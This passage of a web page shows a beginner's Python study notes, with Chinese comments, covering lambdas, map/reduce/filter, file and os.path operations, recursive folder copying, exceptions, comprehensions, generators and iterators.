class=\"code\"><pre><span class=\"line\"># # 匿名函数作为参数</span><br><span class=\"line\"># def func(x, y, func):</span><br><span class=\"line\">#     print(x, y)</span><br><span class=\"line\">#     print(func)</span><br><span class=\"line\">#     s = func(x, y)</span><br><span class=\"line\">#     print(s)</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\"># # 调用func</span><br><span class=\"line\"># func(1,2, lambda a, b: a + b)</span><br><span class=\"line\">#</span><br><span class=\"line\"># # 匿名函数与内置函数的结合使用</span><br><span class=\"line\"># # max, sorted, zip...</span><br><span class=\"line\">#</span><br><span class=\"line\"># list1 = [3, 5, 8, 9, 0]</span><br><span class=\"line\"># m = max(list1)</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(&#x27;max is: &#x27;, m)</span><br><span class=\"line\">#</span><br><span class=\"line\"># list2 = [&#123;&#x27;a&#x27;: 10, &#x27;b&#x27;: 21&#125;, &#123;&#x27;a&#x27;: 13, &#x27;b&#x27;: 19&#125;, &#123;&#x27;a&#x27;: 9, &#x27;b&#x27;: 22&#125;, &#123;&#x27;a&#x27;: 29, &#x27;b&#x27;: 18&#125;]</span><br><span class=\"line\">#</span><br><span class=\"line\"># n = max(list2, key=lambda x: x[&#x27;a&#x27;])</span><br><span class=\"line\"># print(&#x27;max number in list2 is: &#x27;, n)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># map函数</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [3,4,6,7,8,9,9,0,2,5]</span><br><span class=\"line\"></span><br><span class=\"line\">result = map(lambda x: x+2, list1)</span><br><span class=\"line\">print(list(result))</span><br><span class=\"line\"></span><br><span class=\"line\"># 对列表中的奇数进行加1操作</span><br><span class=\"line\"># 方法一</span><br><span class=\"line\">result = map(lambda x: x if x%2==0 else x+1, list1)</span><br><span class=\"line\">print(list(result))</span><br><span class=\"line\"></span><br><span class=\"line\"># 方法二</span><br><span class=\"line\">for index, i in enumerate(list1):</span><br><span class=\"line\">    if i%2 != 0:</span><br><span class=\"line\">        list1[index] = i+1</span><br><span class=\"line\"></span><br><span class=\"line\">print(list1)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;---------------------reduce()---------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># reduce(): 对列表中的元素进行加减乘除运算的函数</span><br><span class=\"line\"></span><br><span class=\"line\">from functools import reduce</span><br><span class=\"line\"></span><br><span class=\"line\">tuple1 = (3,5,7,8,9,1)</span><br><span class=\"line\"></span><br><span class=\"line\">result = reduce(lambda x,y: x+y, tuple1)</span><br><span class=\"line\"></span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\">tuple2 = (1,)</span><br><span class=\"line\"></span><br><span class=\"line\">result = reduce(lambda x,y: x+y, tuple2, 10)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># filter() 筛选函数</span><br><span class=\"line\">list1 = [12,6,8,98,34,36,2,8,0]</span><br><span class=\"line\">result = filter(lambda x:x&gt;10, list1)</span><br><span class=\"line\">print(list(result))</span><br><span class=\"line\"></span><br><span class=\"line\"># sorted() or list.sort() 排序</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"book-system-py\"><a href=\"#book-system-py\" class=\"headerlink\" title=\"book_system.py\"></a>book_system.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 持久化保存：文件</span><br><span class=\"line\"># list 元组，字典-----&gt;内存</span><br><span class=\"line\"></span><br><span class=\"line\"># 用户注册</span><br><span class=\"line\"></span><br><span class=\"line\">def register():</span><br><span class=\"line\">    username = input(&#x27;please input username: &#x27;)</span><br><span class=\"line\">    password = input(&#x27;please input password: &#x27;)</span><br><span class=\"line\">    repassword = input(&#x27;Confirm password: &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    if password == repassword:</span><br><span class=\"line\">        # 保存信息</span><br><span class=\"line\">        with open(r&#x27;a:\\p1\\book\\user.txt&#x27;, &#x27;a&#x27;) as wstream:</span><br><span class=\"line\">            wstream.write(&#x27;&#123;&#125; &#123;&#125;\\n&#x27;.format(username, password))</span><br><span class=\"line\"></span><br><span class=\"line\">        print(&#x27;user register complete!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&#x27;Password not match!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 用户登录</span><br><span class=\"line\">def login():</span><br><span class=\"line\">    username = input(&#x27;please input username: &#x27;)</span><br><span class=\"line\">    password = input(&#x27;please input password: &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    if username and password:</span><br><span class=\"line\">        with open(r&#x27;a:\\p1\\book\\user.txt&#x27;) as rstream:</span><br><span class=\"line\">            while True:</span><br><span class=\"line\">                user = rstream.readline()</span><br><span class=\"line\"></span><br><span class=\"line\">                if not user:</span><br><span class=\"line\">                    print(&#x27;wrong username or password&#x27;)</span><br><span class=\"line\">                    break</span><br><span class=\"line\"></span><br><span class=\"line\">                input_user = &#x27;&#123;&#125; &#123;&#125;\\n&#x27;.format(username, password)</span><br><span class=\"line\"></span><br><span class=\"line\">                if user == input_user:</span><br><span class=\"line\">                    print(&#x27;user login success!&#x27;)</span><br><span class=\"line\">                    break</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def show_books():</span><br><span class=\"line\">    print(&#x27;----------Books in library as follow-----------&#x27;)</span><br><span class=\"line\">    with open(r&#x27;a:\\p1\\book\\books.txt&#x27;, &#x27;r&#x27;) as rstream:</span><br><span class=\"line\">        books = rstream.readlines()</span><br><span class=\"line\">        for book in books:</span><br><span class=\"line\">            print(book, end=&#x27;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># register()</span><br><span class=\"line\"></span><br><span class=\"line\"># login()</span><br><span class=\"line\"></span><br><span class=\"line\">show_books()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"file-operation-py\"><a href=\"#file-operation-py\" class=\"headerlink\" title=\"file_operation.py\"></a>file_operation.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 文件操作</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">文件上传</span><br><span class=\"line\">保存log</span><br><span class=\"line\"></span><br><span class=\"line\">系统函数：</span><br><span class=\"line\">    open(file, mode, buffering, encoding)</span><br><span class=\"line\">读：</span><br><span class=\"line\">    open(path/filename,&#x27;rt&#x27;) ----&gt;返回值：stream(管道)</span><br><span class=\"line\"></span><br><span class=\"line\">    container = stream.read() ----&gt; 读取管道中内容</span><br><span class=\"line\"></span><br><span class=\"line\">    注意：如果传递的path/filename有误，则会报错：FileNotFoundError</span><br><span class=\"line\">        如果读取的是图片文件则不能使用默认的读取方式，应采用 mode = &#x27;rb&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># # 读文件</span><br><span class=\"line\"># stream = open(r&#x27;aa.txt&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\"># container = stream.read()</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(container)</span><br><span class=\"line\">#</span><br><span class=\"line\"># result = stream.readable() # 判断是否可以读取</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(result)</span><br><span class=\"line\">#</span><br><span class=\"line\"># stream.close()</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\"># # 写文件</span><br><span class=\"line\"># stream = open(&#x27;aa.txt&#x27;, &#x27;w&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\"># # writelines(iterable) 没有自动换行</span><br><span class=\"line\"># stream.writelines([&#x27;God of Gamblers:Gao Jin\\n&#x27;,</span><br><span class=\"line\">#                    &#x27;Conman:Xiao Dao\\n&#x27;, &#x27;Saint of Gambler:Zhou Xing Xing\\n&#x27;])</span><br><span class=\"line\">#</span><br><span class=\"line\"># stream.close()</span><br><span class=\"line\"></span><br><span class=\"line\"># print(&#x27;--------------------------------文件的复刻-------------------------------&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\"># &#x27;&#x27;&#x27;</span><br><span class=\"line\"># 原文件：A:\\10.JPG</span><br><span class=\"line\"># 目标文件：A:\\EFI\\10.jpg</span><br><span class=\"line\">#</span><br><span class=\"line\"># with结合open使用，可以帮助我们自动释放资源</span><br><span class=\"line\"># &#x27;&#x27;&#x27;</span><br><span class=\"line\">#</span><br><span class=\"line\"># # stream = open(&#x27;A:\\10.JPG&#x27;, &#x27;rb&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\"># with open(&#x27;A:\\cloud.png&#x27;, &#x27;rb&#x27;) as stream:</span><br><span class=\"line\">#     container = stream.read()</span><br><span class=\"line\">#</span><br><span class=\"line\">#     with open(&#x27;A:\\EFI\\cloud.JPG&#x27;, &#x27;wb&#x27;) as wstream:</span><br><span class=\"line\">#         wstream.write(container)</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(&#x27;File copy complete!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------------------相对路径和绝对路径----------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">r = os.path.isabs(&#x27;A:\\EFI\\cloud.JPG&#x27;) # isabs 判断是否是绝对路径</span><br><span class=\"line\">print(&#x27;----&gt;&#x27;, r)</span><br><span class=\"line\"></span><br><span class=\"line\">r = os.path.isabs(&#x27;../11/Demo01.py&#x27;) # ../ 返回当前文件所在路径的上一级目录</span><br><span class=\"line\">print(&#x27;----&gt;&#x27;, r)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 获取路径：directory</span><br><span class=\"line\"># 当前文件所在文件夹路径</span><br><span class=\"line\">path = os.path.dirname(__file__)</span><br><span class=\"line\">print(path)</span><br><span class=\"line\"></span><br><span class=\"line\"># 通过相对路径得到绝对路径</span><br><span class=\"line\">path = os.path.abspath(&#x27;aa.txt&#x27;)</span><br><span class=\"line\">print(path)</span><br><span class=\"line\"></span><br><span class=\"line\"># 获取当前文件的绝对路径</span><br><span class=\"line\">path = os.path.abspath(__file__)</span><br><span class=\"line\">print(path)</span><br><span class=\"line\"></span><br><span class=\"line\">path = os.getcwd() # 等效 os.path.dirname(__file__)</span><br><span class=\"line\">print(path)</span><br><span class=\"line\"></span><br><span class=\"line\">r = os.path.isfile(os.getcwd())</span><br><span class=\"line\">print(r)</span><br><span class=\"line\"></span><br><span class=\"line\">r = os.path.isdir(os.getcwd())</span><br><span class=\"line\">print(r)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># os.path</span><br><span class=\"line\">path = r&#x27;C:\\Users\\Private\\Desktop\\code2\\1\\file_operation.py&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result = os.path.split(path)</span><br><span class=\"line\"></span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\">print(result[1])</span><br><span class=\"line\"></span><br><span class=\"line\">result = os.path.splitext(path) # 分割文件与扩展名</span><br><span class=\"line\"></span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\">size = os.path.getsize(path) # 获取文件的大小，单位是字节</span><br><span class=\"line\">print(size)</span><br><span class=\"line\"></span><br><span class=\"line\">result = os.path.join(os.getcwd(), &#x27;file&#x27;, &#x27;a&#x27;, &#x27;cloud.png&#x27;)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------os模块函数---------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">if not os.path.exists(r&#x27;a:\\p3&#x27;): # 判断目录是否存在</span><br><span class=\"line\">    f = os.mkdir(r&#x27;a:\\p3&#x27;)</span><br><span class=\"line\">    print(f)</span><br><span class=\"line\"></span><br><span class=\"line\">f = os.rmdir(r&#x27;a:\\p3&#x27;) # 只能删除空文件夹</span><br><span class=\"line\">print(f)</span><br><span class=\"line\"></span><br><span class=\"line\"># f = os.removedirs(r&#x27;a:\\p3&#x27;) # 删除当前目录内所有文件夹</span><br><span class=\"line\"># print(f)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------------------批量文件的复刻----------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\"># print(os.path)</span><br><span class=\"line\"># path = os.path.dirname(__file__) # 获取当前文件所在的文件目录（绝对路径）</span><br><span class=\"line\"># print(path)</span><br><span class=\"line\"># print(type(path))</span><br><span class=\"line\"></span><br><span class=\"line\"># with open(&#x27;A:\\cloud.png&#x27;, &#x27;rb&#x27;) as stream:</span><br><span class=\"line\">#     container = stream.read()</span><br><span class=\"line\">#     print(stream.name)</span><br><span class=\"line\">#     file = stream.name</span><br><span class=\"line\">#     filename = file[file.rfind(&#x27;\\\\&#x27;)+1:] # 截取文件名</span><br><span class=\"line\">#     path = os.path.dirname(__file__)</span><br><span class=\"line\">#     path1 = os.path.join(path, filename)</span><br><span class=\"line\">#</span><br><span class=\"line\">#     with open(path1, &#x27;wb&#x27;) as wstream:</span><br><span class=\"line\">#         wstream.write(container)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">src_path = r&#x27;A:p1&#x27;</span><br><span class=\"line\">target_path = r&#x27;A:\\p2&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># # 无子目录文件复刻</span><br><span class=\"line\"># def copy(src, target):</span><br><span class=\"line\">#     if os.path.isdir(src) and os.path.isdir(target):</span><br><span class=\"line\">#         filelist = os.listdir(src) # [&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;]</span><br><span class=\"line\">#</span><br><span class=\"line\">#         for file in filelist:</span><br><span class=\"line\">#</span><br><span class=\"line\">#             path = os.path.join(src,file)</span><br><span class=\"line\">#             with open(path, &#x27;rb&#x27;) as rstream:</span><br><span class=\"line\">#                 container = rstream.read()</span><br><span class=\"line\">#</span><br><span class=\"line\">#                 path1 = os.path.join(target,file)</span><br><span class=\"line\">#                 with open(path1, &#x27;wb&#x27;) as wstream:</span><br><span class=\"line\">#                     wstream.write(container)</span><br><span class=\"line\">#</span><br><span class=\"line\">#         else:</span><br><span class=\"line\">#             print(&#x27;Copy complete!&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\"></span><br><span class=\"line\"># 有子目录文件复刻</span><br><span class=\"line\">def copy(src_path, target_path):</span><br><span class=\"line\"></span><br><span class=\"line\">    # 获取文件夹里面的内容</span><br><span class=\"line\">    filelist = os.listdir(src_path)</span><br><span class=\"line\">    # 遍历列表</span><br><span class=\"line\">    for file in filelist:</span><br><span class=\"line\">        # 拼接路径</span><br><span class=\"line\">        path = os.path.join(src_path, file)</span><br><span class=\"line\">        # 判断是文件夹还是文件</span><br><span class=\"line\">        if os.path.isdir(path):</span><br><span class=\"line\">            # 递归调用copy()</span><br><span class=\"line\">            target_path1 = os.path.join(target_path, file)</span><br><span class=\"line\">            os.mkdir(target_path1)</span><br><span class=\"line\"></span><br><span class=\"line\">            copy(path, target_path1)</span><br><span class=\"line\"></span><br><span class=\"line\">        else:</span><br><span class=\"line\">            # 不是文件夹则直接进行复制</span><br><span class=\"line\">            with open(path, &#x27;rb&#x27;) as rstream:</span><br><span class=\"line\">                    container = rstream.read()</span><br><span class=\"line\"></span><br><span class=\"line\">                    path1 = os.path.join(target_path, file)</span><br><span class=\"line\">                    with open(path1, &#x27;wb&#x27;) as wstream:</span><br><span class=\"line\">                        wstream.write(container)</span><br><span class=\"line\"></span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&#x27;Copy complete!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">copy(src_path, target_path)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"aa-txt\"><a href=\"#aa-txt\" class=\"headerlink\" title=\"aa.txt\"></a>aa.txt</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">God of Gamblers:Gao Jin</span><br><span class=\"line\">Conman:Xiao Dao</span><br><span class=\"line\">Saint of Gambler:Zhou Xing Xing</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"异常-py\"><a href=\"#异常-py\" class=\"headerlink\" title=\"异常.py\"></a>异常.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 捕获异常</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">注意：</span><br><span class=\"line\">如果是多个except,异常类型的顺序需要注意，最大的Exception要放到最后</span><br><span class=\"line\"></span><br><span class=\"line\">如果使用try-except-else结构，则在try代码中不能出现return</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def Division(a, b):</span><br><span class=\"line\"></span><br><span class=\"line\">    try:</span><br><span class=\"line\">        result = a / b</span><br><span class=\"line\">        print(&#x27;Test line&#x27;)</span><br><span class=\"line\">    # except Exception:</span><br><span class=\"line\">    #     print(&#x27;Error found&#x27;)</span><br><span class=\"line\">    except ValueError:</span><br><span class=\"line\">        print(&#x27;value error found&#x27;)</span><br><span class=\"line\">    except NameError:</span><br><span class=\"line\">        print(&#x27;Name error found&#x27;)</span><br><span class=\"line\">    except ZeroDivisionError:</span><br><span class=\"line\">        print(&#x27;a is divided by zero&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">Division(2, 0)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def func():</span><br><span class=\"line\">    stream = None # 在try内定义的变量stream，在finally内不能使用，需提前声明</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        stream = open(r&#x27;a:\\p1\\book\\books.txt&#x27;)</span><br><span class=\"line\">        container = stream.read()</span><br><span class=\"line\">        print(container)</span><br><span class=\"line\">        return 1  # try内的return不会终止finally的代码</span><br><span class=\"line\">    except Exception as err:</span><br><span class=\"line\">        print(err)</span><br><span class=\"line\">        return 2 # 有异常也不会终止finally的代码</span><br><span class=\"line\">    finally:</span><br><span class=\"line\">        print(&#x27;----------finally----------&#x27;)</span><br><span class=\"line\">        if stream:</span><br><span class=\"line\">            stream.close()</span><br><span class=\"line\">        return 3</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">x = func()</span><br><span class=\"line\">print(x)</span><br><span class=\"line\"></span><br><span class=\"line\"># 抛出异常</span><br><span class=\"line\"></span><br><span class=\"line\">def register():</span><br><span class=\"line\">    username = input(&#x27;please input a username: &#x27;)</span><br><span class=\"line\">    if len(username) &lt; 6:</span><br><span class=\"line\">        raise Exception(&#x27;The length of username should not be less than 6&#x27;) # 抛出自定义异常</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&#x27;The username you inputted is &#x27;, username)</span><br><span class=\"line\"></span><br><span class=\"line\">try:</span><br><span class=\"line\">    register()</span><br><span class=\"line\">except Exception as err:</span><br><span class=\"line\">    print(err)</span><br><span class=\"line\">    print(&#x27;Fail to register&#x27;)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&#x27;Register complete!&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"列表推导式-py\"><a href=\"#列表推导式-py\" class=\"headerlink\" title=\"列表推导式.py\"></a>列表推导式.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 0-5偶数，0-10奇数</span><br><span class=\"line\"># [(偶数， 奇数), (), ().....] 每个偶数与每个奇数组成一个元组</span><br><span class=\"line\"></span><br><span class=\"line\">newlist = [(x, y) for x in range(5) if x % 2 == 0 for y in range(10) if y % 2 != 0]</span><br><span class=\"line\">print(newlist)</span><br><span class=\"line\"></span><br><span class=\"line\">dict1 = &#123;&#x27;name&#x27;: &#x27;Tom&#x27;, &#x27;Salary&#x27;: 5000&#125;</span><br><span class=\"line\">dict2 = &#123;&#x27;name&#x27;: &#x27;Lucy&#x27;, &#x27;Salary&#x27;: 8000&#125;</span><br><span class=\"line\">dict3 = &#123;&#x27;name&#x27;: &#x27;Jack&#x27;, &#x27;Salary&#x27;: 4500&#125;</span><br><span class=\"line\">dict4 = &#123;&#x27;name&#x27;: &#x27;Lily&#x27;, &#x27;Salary&#x27;: 3000&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [dict1, dict2, dict3, dict4]</span><br><span class=\"line\"></span><br><span class=\"line\"># salary大于5000加200, 小于等于5000加500</span><br><span class=\"line\"></span><br><span class=\"line\">newlist = [&#123;employee[&#x27;name&#x27;]: employee[&#x27;Salary&#x27;]+200&#125; if employee[&#x27;Salary&#x27;] &gt; 5000 else &#123;employee[&#x27;name&#x27;]: employee[&#x27;Salary&#x27;]+500&#125; for employee in list1]</span><br><span class=\"line\">print(newlist)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"生成器-py\"><a href=\"#生成器-py\" class=\"headerlink\" title=\"生成器.py\"></a>生成器.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">得到生成器方式：</span><br><span class=\"line\">1.通过列表推导式得到生成器</span><br><span class=\"line\">2.通过函数得到生成器</span><br><span class=\"line\"></span><br><span class=\"line\">__next__(): 获取下一个元素</span><br><span class=\"line\"></span><br><span class=\"line\">sen(value): 向每次生成器调用中传值 注意：第一次调用需用send(None)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># 定义生成器方式一</span><br><span class=\"line\">g = (x*3 for x in range(20))</span><br><span class=\"line\"></span><br><span class=\"line\"># print(type(g))</span><br><span class=\"line\">#</span><br><span class=\"line\"># # 方式一：通过调用__next__()方式得到元素</span><br><span class=\"line\"># print(g.__next__())</span><br><span class=\"line\"># print(g.__next__())</span><br><span class=\"line\">#</span><br><span class=\"line\"># # 方式二：next()</span><br><span class=\"line\"># # 每调用一次next则会产生一个元素</span><br><span class=\"line\"># print(next(g))</span><br><span class=\"line\"># print(next(g))</span><br><span class=\"line\">#</span><br><span class=\"line\"># # StopIteration 调用次数大于生成器可生成的个数则报错</span><br><span class=\"line\"></span><br><span class=\"line\"># while True:</span><br><span class=\"line\">#     try:</span><br><span class=\"line\">#         e = next(g)</span><br><span class=\"line\">#         print(e)</span><br><span class=\"line\">#     except:</span><br><span class=\"line\">#         print(&#x27;No more elements!&#x27;)</span><br><span class=\"line\">#         break</span><br><span class=\"line\"></span><br><span class=\"line\"># 定义生成器方式二：函数</span><br><span class=\"line\"># 只要函数中出现了yield关键字，此时函数就变成生成器</span><br><span class=\"line\"># 菲波那切数列</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">步骤：</span><br><span class=\"line\">1. 定义一个函数，函数中使用yield关键字</span><br><span class=\"line\">2. 调用函数，接收调用的结果</span><br><span class=\"line\">3. 得到的结果就是生成器</span><br><span class=\"line\">4. 借助next(), __next__得到元素</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># def func():</span><br><span class=\"line\">#     n = 0</span><br><span class=\"line\">#     while True:</span><br><span class=\"line\">#         n += 1</span><br><span class=\"line\">#         # print(n)</span><br><span class=\"line\">#         yield n</span><br><span class=\"line\"># g = func()</span><br><span class=\"line\"># print(g)</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(next(g))</span><br><span class=\"line\"># print(next(g))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># def fib(length):</span><br><span class=\"line\">#     a, b = 0, 1</span><br><span class=\"line\">#     n = 0</span><br><span class=\"line\">#     while n&lt;length:</span><br><span class=\"line\">#         # print(b)</span><br><span class=\"line\">#         yield b  # return b + 暂停</span><br><span class=\"line\">#         a, b = b, a+b</span><br><span class=\"line\">#         n += 1</span><br><span class=\"line\">#     return &#x27;No more element&#x27;  # return就是得到在StopIteration后的提示信息</span><br><span class=\"line\">#</span><br><span class=\"line\"># g = fib(4)</span><br><span class=\"line\"># print(next(g))</span><br><span class=\"line\"># print(next(g))</span><br><span class=\"line\"># print(next(g))</span><br><span class=\"line\"># print(next(g))</span><br><span class=\"line\"># print(next(g))</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------------------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># def gen():</span><br><span class=\"line\">#     i = 0</span><br><span class=\"line\">#     while i&lt;5:</span><br><span class=\"line\">#         temp = yield i</span><br><span class=\"line\">#         print(&#x27;temp&#x27;, temp)</span><br><span class=\"line\">#         for x in range(temp):</span><br><span class=\"line\">#             print(&#x27;-------------&gt;&#x27;, x)</span><br><span class=\"line\">#         print(&#x27;**********************&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\">#         i += 1</span><br><span class=\"line\">#</span><br><span class=\"line\">#     return &#x27;No more data&#x27;</span><br><span class=\"line\">#</span><br><span class=\"line\"># g = gen()</span><br><span class=\"line\">#</span><br><span class=\"line\"># # print(next(g))</span><br><span class=\"line\"># # print(next(g))</span><br><span class=\"line\"># # print(next(g))</span><br><span class=\"line\">#</span><br><span class=\"line\"># g.send(None)</span><br><span class=\"line\"># n1 = g.send(2)</span><br><span class=\"line\"># print(&#x27;n1:&#x27;, n1)</span><br><span class=\"line\"># n2 = g.send(3)</span><br><span class=\"line\"># print(&#x27;n2:&#x27;, n2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------------生成器之应用多任务---------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 进程 》 线程 》 协程</span><br><span class=\"line\"># 迅雷</span><br><span class=\"line\"></span><br><span class=\"line\">def task1(n):</span><br><span class=\"line\">    for i in range(n):</span><br><span class=\"line\">        print(&#x27;moving number &#123;&#125; block&#x27;.format(i))</span><br><span class=\"line\">        yield None</span><br><span class=\"line\"></span><br><span class=\"line\">def task2(n):</span><br><span class=\"line\">    for i in range(n):</span><br><span class=\"line\">        print(&#x27;playing number &#123;&#125; song&#x27;.format(i))</span><br><span class=\"line\">        yield None</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">g1 = task1(10)</span><br><span class=\"line\">g2 = task2(10)</span><br><span class=\"line\"></span><br><span class=\"line\">while True:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        next(g1)</span><br><span class=\"line\">        next(g2)</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        break</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"迭代器和可迭代对象-py\"><a href=\"#迭代器和可迭代对象-py\" class=\"headerlink\" title=\"迭代器和可迭代对象.py\"></a>迭代器和可迭代对象.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 可迭代对象：1.生成器；2. 元组，列表，集合，字典，字符串</span><br><span class=\"line\"># 判断一个对象是否可迭代</span><br><span class=\"line\"></span><br><span class=\"line\">from collections.abc import Iterable</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [1, 4, 7, 8, 8]</span><br><span class=\"line\">f = isinstance(list1, Iterable)</span><br><span class=\"line\">print(f)</span><br><span class=\"line\"></span><br><span class=\"line\">f = isinstance(&#x27;abc&#x27;, Iterable)</span><br><span class=\"line\">print(f)</span><br><span class=\"line\"></span><br><span class=\"line\">f = isinstance(100, Iterable)</span><br><span class=\"line\">print(f)</span><br><span class=\"line\"></span><br><span class=\"line\">g = (x+1 for x in range(10))</span><br><span class=\"line\">f = isinstance(g, Iterable)</span><br><span class=\"line\">print(f)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 可以被next()函数调用并不断返回下一个值的对象称为迭代器：Iterator</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [1,2,3,4]</span><br><span class=\"line\">list1 = iter(list1) # 通过iter()函数将可迭代的变量变成一个迭代器</span><br><span class=\"line\"></span><br><span class=\"line\">print(next(list1))</span><br><span class=\"line\">print(next(list1))</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">生成器与迭代器：</span><br><span class=\"line\">生成器是可迭代的，也是迭代器</span><br><span class=\"line\">list是可迭代的，但不是迭代器</span><br><span class=\"line\"></span><br><span class=\"line\">list ---&gt; iter(list) ---&gt; 迭代器 next()</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"正则表达式-py\"><a href=\"#正则表达式-py\" class=\"headerlink\" title=\"正则表达式.py\"></a>正则表达式.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 正则表达式 re--regular expression</span><br><span class=\"line\"></span><br><span class=\"line\">import re</span><br><span class=\"line\"></span><br><span class=\"line\">msg = &#x27;佟丽娅娜扎热巴代斯&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">pattern = re.compile(&#x27;佟丽娅&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">result = pattern.match(msg)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># 使用正则re模块方法：match</span><br><span class=\"line\"></span><br><span class=\"line\">s = 